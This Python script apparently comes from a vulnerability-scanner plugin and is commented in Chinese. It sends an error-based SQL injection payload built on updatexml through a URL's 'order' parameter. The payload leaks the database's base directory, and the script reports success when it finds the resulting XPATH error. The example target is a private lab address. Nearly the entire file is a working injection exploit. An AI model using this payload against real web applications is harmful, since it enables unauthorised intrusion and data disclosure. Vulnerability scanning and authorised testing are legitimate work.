import random
import re

import requests
import  hashlib

def check(url,proxies,timeout):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    try:
        ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
        #random_m5=hashlib.md5(random.randint(10000,99999))
        #print(random_m5)
        payload = f'vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23'
        s = requests.get(url + f'{payload}',timeout=timeout).text
        #print(s)
        result=re.findall("(\(1105, &quot;XPATH syntax error: &#x27;~.*?&#x27;&quot;\))",s,re.DOTALL)[0]
        print(result)
        if result:
            ret['success']=True
    except Exception as e:
        ret['error']=e
    return ret
def main(params):
    result = params.get('result',{})
    url=params.get('url','')
    headers=params.get('headers',{})
    proxies=params.get('proxies',None)      #代理
    timeout=params.get('timeout',5)           #超时时间
    result = check(url,proxies,timeout)
    return result

if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 30,
        ###可选参数###
        'url': "http://192.168.160.201:8000/vuln/?order=",
    }
    print(main(params))